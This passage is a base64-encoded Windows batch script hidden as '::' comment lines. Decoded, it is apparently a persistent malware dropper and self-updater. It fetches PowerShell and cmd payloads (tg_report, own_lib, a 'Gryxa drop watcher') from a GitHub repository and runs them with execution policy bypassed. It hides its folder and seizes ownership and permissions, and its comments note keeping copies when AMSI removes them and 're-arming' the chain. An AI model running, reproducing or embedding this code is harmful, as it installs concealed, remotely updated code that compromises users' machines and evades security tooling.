::ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC8hR0lUX1BJTiEvb3duX3NlY3Vy
::ZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0KICAgIHNldCAiTUFOSUZFU1RfVVJM
::PWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRo
::dWItZHJvcC8hR0lUX1BJTiEvdXBkYXRlLm1hbmlmZXN0P3Q9JVJBTkRPTSUlUkFO
::RE9NJSINCiAgICBzZXQgIk1BTklGRVNUX1NJR19VUkw9aHR0cHM6Ly9yYXcuZ2l0
::aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wLyFHSVRfUElO
::IS91cGRhdGUubWFuaWZlc3Quc2lnP3Q9JVJBTkRPTSUlUkFORE9NJSINCiAgICBl
::Y2hvIGNoYW5uZWxfcGluPSFHSVRfUElOISBtb25fbWluPSFNT05fTUlOISBsaWJf
::bWluPSFMSUJfTUlOISBncnl4YV9taW49IUdSWVhBX01JTiE+PiIlTE9HJSINCiAg
::KQ0KICBlY2hvIGZsb29yIG1vbj0hTU9OX0ZMT09SISBsaWI9IUxJQl9GTE9PUiEg
::Z3J5eGE9IUdSWVhBX0ZMT09SIT4+IiVMT0clIg0KICBjb3B5IC95ICIlU1RBR0Ul
::XGZsZWV0X2NoYW5uZWwuY2ZnIiAiJVdEJVxmbGVldF9jaGFubmVsLmNmZyIgPm51
::bCAyPiYxDQopDQphdHRyaWIgLWggLXMgLXIgIiVXRCUiID5udWwgMj4mMQ0KdGFr
::ZW93biAvRiAiJVdEJSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVdEJSIg
::L3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KaWNhY2xzICIlV0QlIiAvZ3JhbnQg
::Ik5UIEFVVEhPUklUWVxTWVNURU06KE9JKShDSSlGIiAiQlVJTFRJTlxBZG1pbmlz
::dHJhdG9yczooT0kpKENJKUYiIC9UIC9DIC9RID5udWwgMj4mMQ0KYXR0cmliIC1o
::IC1zIC1yICIlV0QlXHRnX3JlcG9ydC5wczEiICIlV0QlXG93bl9zZWN1cmUuY21k
::IiAiJVdEJVxvd25fbGliLnBzMSIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4m
::MQ0KDQpzZXQgIlNFTEZfVVBEPTAiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZv
::a2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RBR0Ul
::XHRnX3JlcG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAi
::JVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3QtdGlt
::ZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcdGdfcmVwb3J0Lm5ldyIg
::IiVURzIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAt
::LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVTVEFHRSVcb3du
::X3NlY3VyZS5uZXciICIlT1dOU0VDJSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3Qg
::IiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10
::aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVNUQUdFJVxvd25fc2VjdXJlLm5l
::dyIgIiVPV05TRUMyJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1y
::ZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlU1RB
::R0UlXG93bl9saWIubmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQ0KaWYgbm90IGV4
::aXN0ICIlU1RBR0UlXG93bl9saWIubmV3IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3Qt
::dGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3duX2xpYi5uZXci
::ICIlT1dOTElCMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2
::b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVNUQUdF
::JVxvd25fbW9uLm5leHQiICIlT1dOTU9OJSIgPm51bCAyPiYxDQppZiBub3QgZXhp
::c3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJUNVUkwlIiAtTCAtLWNvbm5lY3Qt
::dGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3duX21vbi5uZXh0
::IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJl
::dm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFH
::RSVcb3duX2dyeXhhLm5ldyIgIiVPV05HUllYQSUiID5udWwgMj4mMQ0KaWYgbm90
::IGV4aXN0ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlQ1VSTCUiIC1MIC0tY29u
::bmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdFJVxvd25fZ3J5
::eGEubmV3IiAiJU9XTkdSWVhBMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1z
::c2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAt
::byAiJVNUQUdFJVxncnl4YV93YXRjaC5uZXciICIlT1dOV0FUQ0glIiA+bnVsIDI+
::JjENCmlmIG5vdCBleGlzdCAiJVNUQUdFJVxncnl4YV93YXRjaC5uZXciICIlQ1VS
::TCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVNU
::QUdFJVxncnl4YV93YXRjaC5uZXciICIlT1dOV0FUQ0gyJSIgPm51bCAyPiYxDQoi
::JUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgNiAt
::LW1heC10aW1lIDIwIC1vICIlU1RBR0UlXHVwZGF0ZS5tYW5pZmVzdCIgIiVNQU5J
::RkVTVF9VUkwlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9r
::ZSAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRpbWUgMjAgLW8gIiVTVEFHRSVc
::dXBkYXRlLm1hbmlmZXN0LnNpZyIgIiVNQU5JRkVTVF9TSUdfVVJMJSIgPm51bCAy
::PiYxDQoNCnJlbSBNNDI6IHNpZ25lZCB1cGRhdGUubWFuaWZlc3QgZ2F0ZSAoUlNB
::LVNIQTI1NikuIEZhbGxiYWNrIHRvIEJVSUxEIG1hcmtlcnMgaWYgbm8gcHVia2V5
::IHlldC4NCnNldCAiVVBEX09LPTAiDQpzZXQgIk1BUD0iDQppZiBleGlzdCAiJVNU
::QUdFJVxvd25fbGliLm5ldyIgc2V0ICJNQVA9IU1BUCFvd25fbGliLnBzMT0lU1RB
::R0UlXG93bl9saWIubmV3OyINCmlmIGV4aXN0ICIlU1RBR0UlXG93bl9tb24ubmV4
::dCIgc2V0ICJNQVA9IU1BUCFvd25fbW9uLmNtZD0lU1RBR0UlXG93bl9tb24ubmV4
::dDsiDQppZiBleGlzdCAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgc2V0ICJNQVA9
::IU1BUCFvd25fc2VjdXJlLmNtZD0lU1RBR0UlXG93bl9zZWN1cmUubmV3OyINCmlm
::IGV4aXN0ICIlU1RBR0UlXHRnX3JlcG9ydC5uZXciIHNldCAiTUFQPSFNQVAhdGdf
::cmVwb3J0LnBzMT0lU1RBR0UlXHRnX3JlcG9ydC5uZXc7Ig0KaWYgZXhpc3QgIiVT
::VEFHRSVcb3duX2dyeXhhLm5ldyIgc2V0ICJNQVA9IU1BUCFvd25fZ3J5eGEuY21k
::PSVTVEFHRSVcb3duX2dyeXhhLm5ldzsiDQppZiBleGlzdCAiJVNUQUdFJVxncnl4
::YV93YXRjaC5uZXciIHNldCAiTUFQPSFNQVAhZ3J5eGFfd2F0Y2guY21kPSVTVEFH
::RSVcZ3J5eGFfd2F0Y2gubmV3OyINCnNldCAiVlJFUz1taXNzaW5nIg0KaWYgZXhp
::c3QgIiVXRCVcb3duX2xpYi5wczEiIGlmIGV4aXN0ICIlU1RBR0UlXHVwZGF0ZS5t
::YW5pZmVzdCIgaWYgZXhpc3QgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZyIg
::aWYgZGVmaW5lZCBNQVAgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUl
::UiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
::ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
::Y3Rpb24gdmVyaWZ5LXVwZGF0ZSAtV29ya0RpciAiJVdEJSIgLUV4dHJhICIlU1RB
::R0UlXHVwZGF0ZS5tYW5pZmVzdHwlU1RBR0UlXHVwZGF0ZS5tYW5pZmVzdC5zaWd8
::IU1BUCEiYCkgZG8gc2V0ICJWUkVTPSUlUiINCikNCmVjaG8gdXBkYXRlX3Zlcmlm
::eT0hVlJFUyE+PiIlTE9HJSINCmlmIC9JICIhVlJFUyEiPT0ib2siICgNCiAgc2V0
::ICJVUERfT0s9MSINCikgZWxzZSBpZiAvSSAiIVZSRVMhIj09Im1pc3NpbmciICgN
::CiAgc2V0ICJVUERfT0s9ZmFsbGJhY2siDQopIGVsc2UgaWYgL0kgIiFWUkVTISI9
::PSJuby1wdWJrZXkiICgNCiAgc2V0ICJVUERfT0s9ZmFsbGJhY2siDQopIGVsc2Ug
::aWYgL0kgIiFWUkVTOn4wLDEwISI9PSJub3QtaW4tbWFuIiAoDQogIHNldCAiVVBE
::X09LPWZhbGxiYWNrIg0KKSBlbHNlIGlmIC9JICIhVlJFUzp+MCwxMyEiPT0iaGFz
::aC1taXNtYXRjaCIgKA0KICByZW0gTTUwOiBDRE4gbWF5IHNlcnZlIHN0YWxlIG1h
::aW4gd2hpbGUgbWFuaWZlc3QgaXMgZnJlc2gg4oCUIG5ldmVyIHJlZnVzZS1hbGwg
::KHRoYXQgc3R1Y2sgZmxlZXQgb24gTTQ4KS4NCiAgc2V0ICJVUERfT0s9ZmFsbGJh
::Y2siDQogIGVjaG8gdXBkYXRlX2hhc2hfbWlzbWF0Y2hfZmFsbGJhY2tfIVZSRVMh
::Pj4iJUxPRyUiDQopIGVsc2UgKA0KICBlY2hvIHVwZGF0ZV9yZWZ1c2VkXyFWUkVT
::IT4+IiVMT0clIg0KKQ0KDQppZiAvSSAiIVVQRF9PSyEiPT0iMSIgKA0KICBpZiBl
::eGlzdCAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiBtb3ZlIC95ICIlU1RBR0UlXHRn
::X3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5wczEiID5udWwgMj4mMQ0KICBp
::ZiBleGlzdCAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgbW92ZSAveSAiJVNUQUdF
::JVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4m
::MQ0KICBpZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIgKA0KICAgIGNhbGwg
::OlJlZnVzZUlmTGliQmVsb3dGbG9vciAiJVNUQUdFJVxvd25fbGliLm5ldyINCiAg
::ICBpZiBlcnJvcmxldmVsIDEgKA0KICAgICAgZWNobyBsaWJfZG93bmdyYWRlX2Js
::b2NrZWQgZmxvb3I9IUxJQl9GTE9PUiE+PiIlTE9HJSINCiAgICAgIGRlbCAvZiAv
::cSAiJVNUQUdFJVxvd25fbGliLm5ldyIgPm51bCAyPiYxDQogICAgKSBlbHNlICgN
::CiAgICAgIG1vdmUgL3kgIiVTVEFHRSVcb3duX2xpYi5uZXciICIlV0QlXG93bl9s
::aWIucHMxIiA+bnVsIDI+JjENCiAgICAgIGNhbGwgOlBhcnNlTGliTnVtICIlV0Ql
::XG93bl9saWIucHMxIg0KICAgICAgaWYgIV9QTiEgR1RSICFMSUJfRkxPT1IhIHNl
::dCAiTElCX0ZMT09SPSFfUE4hIg0KICAgICkNCiAgKQ0KICBpZiBleGlzdCAiJVNU
::QUdFJVxvd25fZ3J5eGEubmV3IiAoDQogICAgZmluZHN0ciAvQzoiT1dOX0dSWVhB
::IEJVSUxEIiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiA+bnVsIDI+JjENCiAgICBp
::ZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICAgIGNhbGwgOlJlZnVzZUlmR3J5eGFC
::ZWxvd0Zsb29yICIlU1RBR0UlXG93bl9ncnl4YS5uZXciDQogICAgICBpZiBlcnJv
::cmxldmVsIDEgKA0KICAgICAgICBlY2hvIGdyeXhhX2Rvd25ncmFkZV9ibG9ja2Vk
::IGZsb29yPSFHUllYQV9GTE9PUiE+PiIlTE9HJSINCiAgICAgICAgZGVsIC9mIC9x
::ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciID5udWwgMj4mMQ0KICAgICAgKSBlbHNl
::ICgNCiAgICAgICAgbW92ZSAveSAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAiJVdE
::JVxvd25fZ3J5eGEuY21kIiA+bnVsIDI+JjENCiAgICAgICAgY2FsbCA6UGFyc2VH
::cnl4YU51bSAiJVdEJVxvd25fZ3J5eGEuY21kIg0KICAgICAgICBpZiAhX1BOISBH
::VFIgIUdSWVhBX0ZMT09SISBzZXQgIkdSWVhBX0ZMT09SPSFfUE4hIg0KICAgICAg
::KQ0KICAgICkNCiAgKQ0KICBpZiBleGlzdCAiJVNUQUdFJVxncnl4YV93YXRjaC5u
::ZXciICgNCiAgICBmaW5kc3RyIC9DOiJHUllYQV9XQVRDSCBCVUlMRCIgIiVTVEFH
::RSVcZ3J5eGFfd2F0Y2gubmV3IiA+bnVsIDI+JjENCiAgICBpZiBub3QgZXJyb3Js
::ZXZlbCAxIG1vdmUgL3kgIiVTVEFHRSVcZ3J5eGFfd2F0Y2gubmV3IiAiJVdEJVxn
::cnl4YV93YXRjaC5jbWQiID5udWwgMj4mMQ0KICApDQogIHNldCAiU0VMRl9VUEQ9
::MCINCiAgaWYgZXhpc3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAoDQogICAgZmMg
::L2IgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51
::bCAyPiYxDQogICAgaWYgZXJyb3JsZXZlbCAxIHNldCAiU0VMRl9VUEQ9MSINCiAg
::ICBpZiAiIVNFTEZfVVBEISI9PSIwIiBkZWwgL2YgL3EgIiVTVEFHRSVcb3duX21v
::bi5uZXh0IiA+bnVsIDI+JjENCiAgKQ0KKSBlbHNlIGlmIC9JICIhVVBEX09LISI9
::PSJmYWxsYmFjayIgKA0KICBmaW5kc3RyIC9DOiJUR19SRVBPUlQgQlVJTEQiICIl
::U1RBR0UlXHRnX3JlcG9ydC5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgi
::JVNUQUdFJVx0Z19yZXBvcnQubmV3IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92
::ZSAveSAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJVdEJVx0Z19yZXBvcnQucHMx
::IiA+bnVsIDI+JjENCiAgZmluZHN0ciAvQzoiT1dOX1NFQ1VSRSBCVUlMRCIgIiVT
::VEFHRSVcb3duX3NlY3VyZS5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgi
::JVNUQUdFJVxvd25fc2VjdXJlLm5ldyIpIGRvIGlmICUlfnpGIEdUUiA4MDAgbW92
::ZSAveSAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5j
::bWQiID5udWwgMj4mMQ0KICBpZiBleGlzdCAiJVNUQUdFJVxvd25fbGliLm5ldyIg
::KA0KICAgIGZpbmRzdHIgL0M6Ik9XTl9MSUIgIEJVSUxEIiAiJVNUQUdFJVxvd25f
::bGliLm5ldyIgPm51bCAyPiYxDQogICAgaWYgbm90IGVycm9ybGV2ZWwgMSBmb3Ig
::JSVGIGluICgiJVNUQUdFJVxvd25fbGliLm5ldyIpIGRvIGlmICUlfnpGIEdUUiAx
::NTAwICgNCiAgICAgIGNhbGwgOlJlZnVzZUlmTGliQmVsb3dGbG9vciAiJVNUQUdF
::JVxvd25fbGliLm5ldyINCiAgICAgIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgICAg
::IGVjaG8gbGliX2Rvd25ncmFkZV9ibG9ja2VkIGZsb29yPSFMSUJfRkxPT1IhPj4i
::JUxPRyUiDQogICAgICAgIGRlbCAvZiAvcSAiJVNUQUdFJVxvd25fbGliLm5ldyIg
::Pm51bCAyPiYxDQogICAgICApIGVsc2UgKA0KICAgICAgICBtb3ZlIC95ICIlU1RB
::R0UlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQog
::ICAgICAgIGNhbGwgOlBhcnNlTGliTnVtICIlV0QlXG93bl9saWIucHMxIg0KICAg
::ICAgICBpZiAhX1BOISBHVFIgIUxJQl9GTE9PUiEgc2V0ICJMSUJfRkxPT1I9IV9Q
::TiEiDQogICAgICApDQogICAgKQ0KICApDQogIGlmIGV4aXN0ICIlU1RBR0UlXG93
::bl9ncnl4YS5uZXciICgNCiAgICBmaW5kc3RyIC9DOiJPV05fR1JZWEEgQlVJTEQi
::ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciID5udWwgMj4mMQ0KICAgIGlmIG5vdCBl
::cnJvcmxldmVsIDEgZm9yICUlRiBpbiAoIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIp
::IGRvIGlmICUlfnpGIEdUUiA1MDAgKA0KICAgICAgY2FsbCA6UmVmdXNlSWZHcnl4
::YUJlbG93Rmxvb3IgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyINCiAgICAgIGlmIGVy
::cm9ybGV2ZWwgMSAoDQogICAgICAgIGVjaG8gZ3J5eGFfZG93bmdyYWRlX2Jsb2Nr
::ZWQgZmxvb3I9IUdSWVhBX0ZMT09SIT4+IiVMT0clIg0KICAgICAgICBkZWwgL2Yg
::L3EgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgPm51bCAyPiYxDQogICAgICApIGVs
::c2UgKA0KICAgICAgICBtb3ZlIC95ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIl
::V0QlXG93bl9ncnl4YS5jbWQiID5udWwgMj4mMQ0KICAgICAgICBjYWxsIDpQYXJz
::ZUdyeXhhTnVtICIlV0QlXG93bl9ncnl4YS5jbWQiDQogICAgICAgIGlmICFfUE4h
::IEdUUiAhR1JZWEFfRkxPT1IhIHNldCAiR1JZWEFfRkxPT1I9IV9QTiEiDQogICAg
::ICApDQogICAgKQ0KICApDQogIGlmIGV4aXN0ICIlU1RBR0UlXGdyeXhhX3dhdGNo
::Lm5ldyIgKA0KICAgIGZpbmRzdHIgL0M6IkdSWVhBX1dBVENIIEJVSUxEIiAiJVNU
::QUdFJVxncnl4YV93YXRjaC5uZXciID5udWwgMj4mMQ0KICAgIGlmIG5vdCBlcnJv
::cmxldmVsIDEgZm9yICUlRiBpbiAoIiVTVEFHRSVcZ3J5eGFfd2F0Y2gubmV3Iikg
::ZG8gaWYgJSV+ekYgR1RSIDgwMCBtb3ZlIC95ICIlU1RBR0UlXGdyeXhhX3dhdGNo
::Lm5ldyIgIiVXRCVcZ3J5eGFfd2F0Y2guY21kIiA+bnVsIDI+JjENCiAgKQ0KICBz
::ZXQgIlNFTEZfVVBEPTAiDQogIGZpbmRzdHIgL0M6Ik9XTl9NT04gIEJVSUxEIiAi
::JVNUQUdFJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3Js
::ZXZlbCAxIGZvciAlJUYgaW4gKCIlU1RBR0UlXG93bl9tb24ubmV4dCIpIGRvIGlm
::ICUlfnpGIEdUUiAxNTAwICgNCiAgICBmYyAvYiAiJVNUQUdFJVxvd25fbW9uLm5l
::eHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgICBpZiBlcnJvcmxl
::dmVsIDEgc2V0ICJTRUxGX1VQRD0xIg0KICApDQogIGlmICIlU0VMRl9VUEQlIj09
::IjAiIGRlbCAvZiAvcSAiJVNUQUdFJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0K
::KSBlbHNlICgNCiAgZGVsIC9mIC9xICIlU1RBR0UlXHRnX3JlcG9ydC5uZXciICIl
::U1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJVNUQUdFJVxvd25fbGliLm5ldyIgIiVT
::VEFHRSVcb3duX21vbi5uZXh0IiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAiJVNU
::QUdFJVxncnl4YV93YXRjaC5uZXciID5udWwgMj4mMQ0KICBzZXQgIlNFTEZfVVBE
::PTAiDQopDQpjYWxsIDpTYXZlRmxvb3INCg0KcmVtIE01ODogbnVtZXJpYyBzdGlj
::a3kgZmxvb3Ig4oCUIHJlZnVzZSBhbnkgc3RhZ2VkIG1vbiBiZWxvdyBNT05fRkxP
::T1IgKENETi9zdGFsZSBjYW5ub3Qgcm9sbCBiYWNrKQ0KaWYgIiFTRUxGX1VQRCEi
::PT0iMSIgaWYgZXhpc3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAoDQogIGNhbGwg
::OlJlZnVzZUlmTW9uQmVsb3dGbG9vciAiJVNUQUdFJVxvd25fbW9uLm5leHQiDQog
::IGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBtb25fZG93bmdyYWRlX2Jsb2Nr
::ZWQgZmxvb3I9IU1PTl9GTE9PUiE+PiIlTE9HJSINCiAgICBkZWwgL2YgL3EgIiVT
::VEFHRSVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCiAgICBzZXQgIlNFTEZfVVBE
::PTAiDQogICkNCikNCg0KZGVsIC9mIC9xICIlU1RBR0UlXHRnX3JlcG9ydC5uZXci
::ICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiAiJVNUQUdFJVxvd25fbGliLm5ldyIg
::IiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgIiVTVEFHRSVcZ3J5eGFfd2F0Y2gubmV3
::IiA+bnVsIDI+JjENCmRlbCAvZiAvcSAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3Qi
::ICIlU1RBR0UlXHVwZGF0ZS5tYW5pZmVzdC5zaWciID5udWwgMj4mMQ0KDQpyZW0g
::TTYxOiBlbnN1cmUgR3J5eGEgZHJvcCB3YXRjaGVyIGlzIHByZXNlbnQgKyBsb29w
::aW5nDQpjYWxsIDpFbnN1cmVHcnl4YVdhdGNoDQoNCnJlbSBNNDM6IGlmIGxpYiBz
::dGlsbCBtaXNzaW5nIChBTVNJIHdpcGVkIGl0IC8gbmV2ZXIgbGFuZGVkKSwga2Vl
::cCBhIFRFTVAgY29weSBmb3IgZmFsbGJhY2tzDQppZiBub3QgZXhpc3QgIiVXRCVc
::b3duX2xpYi5wczEiIGlmIGV4aXN0ICIlU1RBR0UlXG93bl9saWIubmV3IiAoDQog
::IGNhbGwgOlJlZnVzZUlmTGliQmVsb3dGbG9vciAiJVNUQUdFJVxvd25fbGliLm5l
::dyINCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBjb3B5IC95ICIlU1RBR0UlXG93bl9s
::aWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQopDQppZiBub3Qg
::ZXhpc3QgIiVXRCVcb3duX2dyeXhhLmNtZCIgKA0KICAiJUNVUkwlIiAtTCAtLXNz
::bC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDIwIC1v
::ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlT1dOR1JZWEElIiA+bnVsIDI+JjEN
::CiAgaWYgbm90IGV4aXN0ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlQ1VSTCUi
::IC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdF
::JVxvd25fZ3J5eGEubmV3IiAiJU9XTkdSWVhBMiUiID5udWwgMj4mMQ0KICBpZiBl
::eGlzdCAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAoDQogICAgY2FsbCA6UmVmdXNl
::SWZHcnl4YUJlbG93Rmxvb3IgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyINCiAgICBp
::ZiBlcnJvcmxldmVsIDEgKA0KICAgICAgZWNobyBncnl4YV9ib290c3RyYXBfcmVm
::dXNlZF9kb3duZ3JhZGU+PiIlTE9HJSINCiAgICAgIGRlbCAvZiAvcSAiJVNUQUdF
::JVxvd25fZ3J5eGEubmV3IiA+bnVsIDI+JjENCiAgICApIGVsc2UgKA0KICAgICAg
::bW92ZSAveSAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAiJVdEJVxvd25fZ3J5eGEu
::Y21kIiA+bnVsIDI+JjENCiAgICAgIGNhbGwgOlBhcnNlR3J5eGFOdW0gIiVXRCVc
::b3duX2dyeXhhLmNtZCINCiAgICAgIGlmICFfUE4hIEdUUiAhR1JZWEFfRkxPT1Ih
::IHNldCAiR1JZWEFfRkxPT1I9IV9QTiEiDQogICAgICBjYWxsIDpTYXZlRmxvb3IN
::CiAgICApDQogICkNCikNCg0KcmVtIE00Mjogc2V2cnouY2ZnIGR5bmFtaWMgRlAg
::ZnJvbSByZXBvIHNldnJ6X2V4cGVjdGVkLmNmZw0KaWYgZXhpc3QgIiVXRCVcc2V2
::cnouY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUl
::SyBpbiAoIiVXRCVcc2V2cnouY2ZnIikgZG8gKA0KICBpZiAvSSAiJSVLIj09IlBS
::SU1BUllfRlAiIHNldCAiS0VFUF9GUD0lJUwiDQogIGlmIC9JICIlJUsiPT0iQUxU
::X0ZQIiBzZXQgIkFMVF9GUD0lJUwiDQopDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1y
::ZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIlU1RB
::R0UlXHNldnJ6X2V4cGVjdGVkLm5ldyIgIiVTRVZSWl9FWFBfVVJMJSIgPm51bCAy
::PiYxDQppZiBub3QgZXhpc3QgIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiAi
::JUNVUkwlIiAtTCAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRpbWUgMjAgLW8g
::IiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiAiJVNFVlJaX0VYUF9VUkwyJSIg
::Pm51bCAyPiYxDQppZiBleGlzdCAiJVNUQUdFJVxzZXZyel9leHBlY3RlZC5uZXci
::IGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFj
::a3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiJHQ9
::R2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclU1RBR0UlXHNldnJ6X2V4cGVjdGVk
::Lm5ldycgLVJhdzsgJiAnJVdEJVxvd25fbGliLnBzMScgLUFjdGlvbiBzeW5jLXNl
::dnJ6LWZwIC1Xb3JrRGlyICclV0QlJyAtRXh0cmEgJHQiYCkgZG8gKA0KICAgIGVj
::aG8gc2V2cnpfc3luYyAlJVI+PiIlTE9HJSINCiAgICBmb3IgL2YgInRva2Vucz0y
::LDMgZGVsaW1zPXwiICUlQSBpbiAoIiUlUiIpIGRvICgNCiAgICAgIGlmIG5vdCAi
::JSVBIj09IiIgc2V0ICJLRUVQX0ZQPSUlQSINCiAgICAgIGlmIG5vdCAiJSVCIj09
::IiIgc2V0ICJBTFRfRlA9JSVCIg0KICAgICkNCiAgKQ0KKQ0KZGVsIC9mIC9xICIl
::U1RBR0UlXHNldnJ6X2V4cGVjdGVkLm5ldyIgPm51bCAyPiYxDQppZiBleGlzdCAi
::JVdEJVxzZXZyei5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxp
::bXM9PSIgJSVLIGluICgiJVdEJVxzZXZyei5jZmciKSBkbyAoDQogIGlmIC9JICIl
::JUsiPT0iUFJJTUFSWV9GUCIgc2V0ICJLRUVQX0ZQPSUlTCINCiAgaWYgL0kgIiUl
::SyI9PSJBTFRfRlAiIHNldCAiQUxUX0ZQPSUlTCINCikNCg0KcmVtIOKUgOKUgCBb
::Ql0gcmUtYXJtIGNoYWluIDE6IG93bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0ZW5j
::ZS1vbmx5KSDilIDilIANCnJlbSBMMTEvTTIyOiBRdWVyeS1vbmx5IHNraXBwZWQg
